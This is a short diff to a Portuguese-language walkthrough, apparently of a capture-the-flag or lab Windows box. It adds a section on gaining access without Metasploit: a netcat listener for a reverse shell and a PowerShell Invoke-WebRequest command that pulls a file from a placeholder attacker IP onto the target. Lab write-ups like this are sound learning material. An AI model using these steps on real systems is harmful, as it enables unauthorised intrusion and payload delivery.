@@ -57,3 +57,10 @@ depois é só reiniciar o serviço com:
 Pelo acesso de root basta navegar ate o desktop do usuário administrador. Lembrando que para listar pastas no cmd usamos ``dir`` e o equivalente ao ``cat`` é ``type``
 
 
+## Fazendo sem o metasploit
+A fase de entrar no sistema é bem simples. Mantenha um netcat listener na porta que você colocou no arquivo do exploit.
+para fazer o upload do arquivo usamos ``powershell -c "Invoke-WebRequest -OutFile <nome do arquivo na saida> http://<attacker ip>/<arquivo para subir>"``
+
+
+
+
